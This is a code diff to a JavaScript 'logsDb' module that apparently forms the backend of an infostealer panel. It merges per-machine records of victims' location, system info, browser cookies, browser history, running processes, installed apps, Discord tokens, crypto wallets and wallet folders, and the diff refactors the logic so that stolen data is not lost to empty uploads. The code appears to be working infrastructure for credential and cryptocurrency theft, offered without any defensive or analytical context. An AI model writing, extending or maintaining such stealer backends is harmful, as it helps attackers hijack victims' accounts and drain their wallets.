@@ -217,10 +217,20 @@ const logsDb = {
             // Helper function to check if a value is actually provided (not just undefined)
             const hasValue = (val) => val !== undefined && val !== null;
             
-            // Helper function to check if array has meaningful data (not just empty)
+            // Helper function to check if array has meaningful data
             const hasArrayData = (arr) => Array.isArray(arr) && arr.length > 0;
             
-            // Merge pcData - use new data if provided, otherwise keep existing
+            // Helper function to check if browserHistory has data
+            const hasHistoryData = (bh) => {
+                if (!bh || typeof bh !== 'object') return false;
+                return (bh.chromeHistory?.length > 0) ||
+                       (bh.firefoxHistory?.length > 0) ||
+                       (bh.edgeHistory?.length > 0) ||
+                       (bh.operaHistory?.length > 0) ||
+                       (bh.braveHistory?.length > 0);
+            };
+            
+            // Merge pcData - use new data if provided and has content, otherwise keep existing
             const mergedPcData = {
                 ...existingPcData,
                 // Override with new values if they are provided
@@ -230,34 +240,37 @@ const logsDb = {
                 location: hasValue(pcData.location) ? pcData.location : existingPcData.location,
                 systemInfo: hasValue(pcData.systemInfo) ? pcData.systemInfo : existingPcData.systemInfo,
                 browserCookies: hasValue(pcData.browserCookies) ? pcData.browserCookies : existingPcData.browserCookies,
-                // For arrays/lists: use new data if it has items, otherwise keep existing
-                // This ensures we don't overwrite good data with empty arrays
+                // For arrays: use new data if it has items, otherwise keep existing (don't overwrite with empty)
                 runningProcesses: hasArrayData(pcData.runningProcesses) 
                     ? pcData.runningProcesses 
-                    : (Array.isArray(existingPcData.runningProcesses) && existingPcData.runningProcesses.length > 0 
+                    : (hasArrayData(existingPcData.runningProcesses) 
                         ? existingPcData.runningProcesses 
-                        : (Array.isArray(pcData.runningProcesses) ? pcData.runningProcesses : [])),
+                        : []),
                 installedApps: hasArrayData(pcData.installedApps) 
                     ? pcData.installedApps 
-                    : (Array.isArray(existingPcData.installedApps) && existingPcData.installedApps.length > 0 
+                    : (hasArrayData(existingPcData.installedApps) 
                         ? existingPcData.installedApps 
-                        : (Array.isArray(pcData.installedApps) ? pcData.installedApps : [])),
-                browserHistory: hasValue(pcData.browserHistory) && (
-                    pcData.browserHistory.chromeHistory?.length > 0 ||
-                    pcData.browserHistory.firefoxHistory?.length > 0 ||
-                    pcData.browserHistory.edgeHistory?.length > 0 ||
-                    pcData.browserHistory.operaHistory?.length > 0 ||
-                    pcData.browserHistory.braveHistory?.length > 0
-                ) ? pcData.browserHistory : (existingPcData.browserHistory || {}),
-                discordTokens: (hasValue(pcData.discordTokens) && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0)
+                        : []),
+                browserHistory: hasHistoryData(pcData.browserHistory) 
+                    ? pcData.browserHistory 
+                    : (hasHistoryData(existingPcData.browserHistory) 
+                        ? existingPcData.browserHistory 
+                        : {}),
+                discordTokens: (hasValue(pcData.discordTokens) && hasArrayData(pcData.discordTokens))
                     ? pcData.discordTokens 
-                    : existingPcData.discordTokens,
-                cryptoWallets: (hasValue(pcData.cryptoWallets) && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0)
+                    : (hasArrayData(existingPcData.discordTokens) 
+                        ? existingPcData.discordTokens 
+                        : null),
+                cryptoWallets: (hasValue(pcData.cryptoWallets) && hasArrayData(pcData.cryptoWallets))
                     ? pcData.cryptoWallets 
-                    : existingPcData.cryptoWallets,
-                cryptoWalletFolders: (hasValue(pcData.cryptoWalletFolders) && Array.isArray(pcData.cryptoWalletFolders) && pcData.cryptoWalletFolders.length > 0)
+                    : (hasArrayData(existingPcData.cryptoWallets) 
+                        ? existingPcData.cryptoWallets 
+                        : null),
+                cryptoWalletFolders: (hasValue(pcData.cryptoWalletFolders) && hasArrayData(pcData.cryptoWalletFolders))
                     ? pcData.cryptoWalletFolders 
-                    : existingPcData.cryptoWalletFolders
+                    : (hasArrayData(existingPcData.cryptoWalletFolders) 
+                        ? existingPcData.cryptoWalletFolders 
+                        : null)
             };
             
             // Recalculate dataSummary from merged data to get accurate counts
